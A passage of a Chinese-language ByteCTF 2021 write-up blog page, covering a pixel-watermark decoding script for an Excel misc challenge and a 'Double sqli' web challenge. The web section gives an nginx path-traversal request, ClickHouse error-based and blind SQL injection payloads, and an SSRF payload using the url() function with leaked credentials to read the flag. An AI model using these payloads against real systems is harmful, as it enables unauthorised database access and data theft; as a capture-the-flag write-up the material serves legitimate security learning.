QlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634623169840229/80d32c00c3d0fe4eedbb534c19f06e757a6283c5.png@300w.png"></p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634623235868402/62e8be17e34f38fb1f362ced90b75e283a7de73b.png@200w.png"></p>
+<p>這裡又要腦洞一下，每四個畫素塊作為一個點，以黑點的順序代表 0/1/2/3，最終達成四進位制。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634626277976703/5bd70238a680893c745bf355b23e5bbd187bf550.png"></p>
+<p>參考 W&amp;M 的 Write Up 寫出瞭如下程式碼來獲取 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;solved.png&quot;</span>).convert(<span class="string">&quot;P&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, height - <span class="number">7</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, width - <span class="number">7</span>, <span class="number">8</span>):</span><br><span class="line">        data = [image.getpixel((x, y)), image.getpixel((x + <span class="number">4</span>, y)), image.getpixel((x, y + <span class="number">4</span>)), image.getpixel((x + <span class="number">4</span>, y + <span class="number">4</span>))]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> <span class="keyword">in</span> data:</span><br><span class="line">            result += <span class="built_in">str</span>(data.index(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(number.long_to_bytes(<span class="built_in">int</span>(result, <span class="number">4</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>執行指令碼可以得到如下資訊。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xc3\x1aY\x19\x19[\x95\xd3_@\x10\x9e]\x19P\xd5\x11\x9d0\x1e\x18\xd9[\x12\x1aY\x19\x19[\x95\xd3_@\x10\x9eULP\xd5\x11\x9e\xd1^\x18\xd9[\x12\x1aY\x19\x19[\x95\xd1\x03@\x10\x9e]\x19P\xd5\x11\x9e\xd1^\x18\xd9[\x12\x1a\\\x10\x19[\x95\xd3_@\x10\x9e]\x19P\xd5\x11\x9e\xd1^\x00\x11[\x12\x1aY\x19\x19[\x95\xd3_@\x10\x9e]\x19P\\F&#123;ExcelHiddenWM&#125;\x00\xe7\x97FT5Dg\xb4W\x866V\xc4\x86\x96FFe\x11t\xd7\xd0\x04&#x27;\x97FT5Dg\xb4W\x866V\xe1\x06\x96FFV\xe5t\xd7\xd0\x04&#x27;\x97FT5D`\x15^\x18\xd9[\x12\x1aY\x19\x19[\x95\xd3_@\x10\x9ez\x19P\xd5\x11\x9e\xd1^\x18\xd9[\x12\x1aY\x19\x19[\x95\xd3P\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&#123;ExcelHiddenWM&#125;\x00ByteCTF&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在其中可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;ExcelHiddenWM&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Double-sqli"><a href="#Double-sqli" class="headerlink" title="Double sqli"></a>Double sqli</h3><h4 id="目錄穿越讀原始碼"><a href="#目錄穿越讀原始碼" class="headerlink" title="目錄穿越讀原始碼"></a>目錄穿越讀原始碼</h4><p>直接訪問到 / 路由時可以得到一張圖片的超連結，觀察到其路由中有 /files 且使用的後端 server 是 nginx/1.21.1，嘗試使用目錄穿越去讀取檔案。構造 files../app/main.py 可以讀出如下原始碼。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> clickhouse_driver</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = clickhouse_driver.Client(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="string">&#x27;9000&#x27;</span>, database=<span class="string">&#x27;default&#x27;</span>, user=<span class="string">&#x27;user_02&#x27;</span>, password=<span class="string">&#x27;e4649b934ca495991b78&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cttttf</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    sql = <span class="string">&#x27;select ByteCTF from hello where 1=&#123;&#125; &#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = client.execute(sql)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;a href=&quot;/files/test.jpg&quot;&gt;something in files&lt;/a&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(a)[<span class="number">3</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中可以發現使用的資料庫是 ClickHouse 及程式中使用的語句邏輯，還有 user_02/e4649b934ca495991b78 這對使用者名稱密碼。除此之外在 ClickHouse 的目錄下的 /var/lib/clickhouse/access/3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sql 中可以發現如下語句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY &#39;e3b0c44298fc1c149afb&#39;;</span><br><span class="line">ATTACH GRANT SELECT ON ctf.* TO user_01;</span><br></pre></td></tr></table></figure>
+
+<p>可以發現使用者 user_01 擁有 ctf.* 的許可權，因此嘗試注入。</p>
+<h4 id="ClickHouse-注入"><a href="#ClickHouse-注入" class="headerlink" title="ClickHouse 注入"></a>ClickHouse 注入</h4><p>使用如下載荷可以在報錯中得到庫名 ctf 和 default。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.databases limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用如下載荷可以在報錯中得到表名 hint 和 hello。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.tables limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用如下載荷嘗試讀取使用者可以發現許可權不足報出的如下資訊。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.users limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">DB::Exception: user_02: <span class="keyword">Not</span> enough privileges.</span><br></pre></td></tr></table></figure>
+
+<p>因此得以確定目前的使用者是 user_02，且需要切換到擁有許可權的 user_01。此時需要用到 ClickHouse 的 HTTP Interface，在其文件中存在如下描述，因此可知預設埠是 8123。</p>
+<blockquote>
+<p>The HTTP interface lets you use ClickHouse on any platform from any programming language. We use it for working from Java and Perl, as well as shell scripts. In other departments, the HTTP interface is used from Perl, Python, and Go. The HTTP interface is more limited than the native interface, but it has better compatibility.</p>
+<p>By default, <code>clickhouse-server</code> listens for HTTP on port 8123 (this can be changed in the config).</p>
+</blockquote>
+<p>同時在 Table Functions 中可以發現如下使用 url 進行的操作辦法。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/sql-reference/table-functions/url/">https://clickhouse.com/docs/en/sql-reference/table-functions/url/</a></p>
+</blockquote>
+<p>二者配合起來構造如下載荷，使用 user_01 去查詢列，可以發現列 flag。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520name%2520from%2520system.columns%2520limit%25200,1&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>根據上文發現的 SQL 檔案可知 flag 列位於 ctf 表中，因此構造出如下載荷來獲取 flag。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br><span class="line">ByteCTF&#123;e3b0c44298fc1c149afbf4c8&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="一種盲注的思路"><a href="#一種盲注的思路" class="headerlink" title="一種盲注的思路"></a>一種盲注的思路</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">39.105</span><span class="number">.175</span><span class="number">.150</span>:<span class="number">30001</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span> <span class="keyword">OR</span> startsWith((extractAll(((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.databases limit <span class="number">1</span>,<span class="number">1</span>)<span class="number">.2</span>), <span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]),<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>extractAll(str, ‘.’) 可以將字串逐位分割，同時陣列可以使用 [0] 進行訪問而元組可以使用 .0 的方式訪問。使用 startsWith 配合字串可以進行逐位爆破。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Ｍisc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HearingNotBelieving"><span class="toc-number">1.1.</span> <span class="toc-text">HearingNotBelieving</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyShark"><span class="toc-number">1.2.</span> <span class="toc-text">BabyShark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frequently"><span class="toc-number">1.3.</span> <span class="toc-text">frequently</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Protocol-Tunnel"><span class="toc-number">1.3.1.</span> <span class="toc-text">DNS Protocol Tunnel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DHCP-Protocol-IP-Address-Lease-Time"><span class="toc-number">1.3.2.</span> <span class="toc-text">DHCP Protocol IP Address Lease Time</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lost-Excel"><span class="toc-number">1.4.</span> <span class="toc-text">Lost Excel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-sqli"><span class="toc-number">2.1.</span> <span class="toc-text">Double sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E9%8C%84%E7%A9%BF%E8%B6%8A%E8%AE%80%E5%8E%9F%E5%A7%8B%E7%A2%BC"><span class="toc-number">2.1.1.</span> <span class="toc-text">目錄穿越讀原始碼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClickHouse-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">ClickHouse 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E7%A8%AE%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">一種盲注的思路</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/611b2d51.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&text=ByteCTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&is_video=false&description=ByteCTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
